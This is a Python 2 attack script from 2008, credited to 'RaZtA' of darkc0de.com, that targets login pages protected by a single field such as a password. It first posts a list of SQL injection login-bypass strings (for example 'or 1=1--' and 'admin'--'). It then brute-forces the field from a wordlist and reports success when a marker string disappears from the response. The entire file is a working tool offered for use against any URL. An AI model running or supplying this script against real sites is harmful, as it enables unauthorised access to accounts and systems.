#!usr/bin/python

#############################################
##         1 X FIELD BRUTE v 1.0           ## 
#############################################
#                                           #
#               25/08/2008                  #
# This script brute forces login pages with #
# only one login credential, such as a pass #
# word. I built this script because I could #
# not find a program that would do this for #
# me. This is my first ever program, so be  #
# nice, there will be plenty more to come.  #
#                                           #
#############################################
#                 RaZtA                     #
#############################################
#            www.darkc0de.com               #
#############################################

# Import system shit

import sys, re, urllib, urllib2, socket, time, httplib, cookielib, threading

# Set socket timeout in seconds

socket.setdefaulttimeout(10)

# Hello World

if len(sys.argv) <= 1:
	print
	print "Usage: ./1xfieldbrute.py http://www.site.com/login.php password words.txt"
	print "Type -help for more detailed information\n"
	sys.exit(1)

# Help screen

for arg in sys.argv:
	if arg == "-help":	
		print "----------------------------------------------------------------------------"
		print "1xFieldBrute v1.0					            - RaZtA"
		print "----------------------------------------------------------------------------"
		print "Usage: ./1xfieldbrute.py http://www.site.com/login.php password wordlist.txt"
		print 
		print "All fields are required!"
		print "1st argument:	URL		Eg: http://www.site.com/login.php"
		print "2nd argument:	Post parameter 	Eg: password"
		print "3rd argument	Wordlist	Eg: words.txt"
		print "-help		This help screen"
		print
		print "If you are receiving false positives, change the identifier variable"
		print "within the source code. Default = Password:"
		print
		sys.exit(1)

# Input variables

host = sys.argv[1]
param = sys.argv[2]
wordl = sys.argv[3]

# Other variables - (identifier - identifies wether a login is successful or not)

identifier = "Password:"

# Some output to reassure user

print
print "---------------------------------------------------------------------------"
print "[-] 1xFieldBrute	v1.0					    - RaZtA"
print "[+] Host:", host 
print "[+] Post:", param 

# Open wordlist

try:
  	words = open(sys.argv[3], "r").readlines()
  	print "[+] Words Loaded:",len(words)
	print "---------------------------------------------------------------------------"
	print "[+] Starting to crack... Good luck!\n"
	print
except(IOError): 
  	print "[!] Error: Check your wordlist path\n"
  	sys.exit(1)

# Try SQL injection login bypass first

sqlis = ["hi' or 1=1","hi' or 1=1--","a' or 't'='t","'OR'",'" or 1=1--',"or 1=1--","' or 'a'='a",'" or "a"="a',"') or ('a'='a","admin'--","admin' # ","admin'/*","' or 1=1#","' or 1=1/*","'or user_id=2/*"]

print "[-] Will try and bypass login with SQL injection first.\n"

for sqli in sqlis:
	login_form_seq = [(param, sqli),('submit', 'submit')]

	login_form_data = urllib.urlencode(login_form_seq)
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

	try:
		opener.addheaders = [('User-agent', 'Mozilla/5.0')]
		opener.addheaders = [('Referer', host)]		

		site = opener.open(host, login_form_data).read()
		print "[+] Trying:", sqli

	except(urllib2.URLError), msg:
		print "[!] Error:", msg, "- Check the URL\n"
		site = ""	
		sys.exit(1)

# Read SQL injection response 

	if re.search(param, site) == None:
		print "\n\t[!] Error: Post parameter [",param,"] not found, please check and try again"
		print
		sys.exit(1)

	if re.search(identifier,site) == None:
		print "\n\t[+] Login Successful:",sqli,"\n"
		print
		sys.exit(1)

# Turn wordlist into an array and set POST variables, if more POST variables need to be amended, 
# add them to the login_form_seq array.

print 
print "[-] Now moving on to the wordlist\n"

for word in words:
	word = word.replace("\r","").replace("\n","")

	login_form_seq = [(param, word),('submit', 'submit')]

# Send POST data and declare additional headers to be sent, including cookies.

	login_form_data = urllib.urlencode(login_form_seq)
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

	try:
		opener.addheaders = [('User-agent', 'Mozilla/5.0')]
		opener.addheaders = [('Referer', host)]		

		site = opener.open(host, login_form_data).read()
		print "[+] Trying:", word

	except(urllib2.URLError), msg:
		print "[!] Error:", msg, "- Check the URL\n"
		site = ""	
		sys.exit(1)

# Read wordlist response 

	if re.search(param, site) == None:
		print "\n\t[!] Error: Post parameter [",param,"] not found, please check and try again"
		print
		sys.exit(1)

	if re.search(identifier,site) == None:
		print "\n\t[+] Login Successful:",word,"\n"
		print
		sys.exit(1)

# Output if password not found
	
print "\n[-] No password found"
print
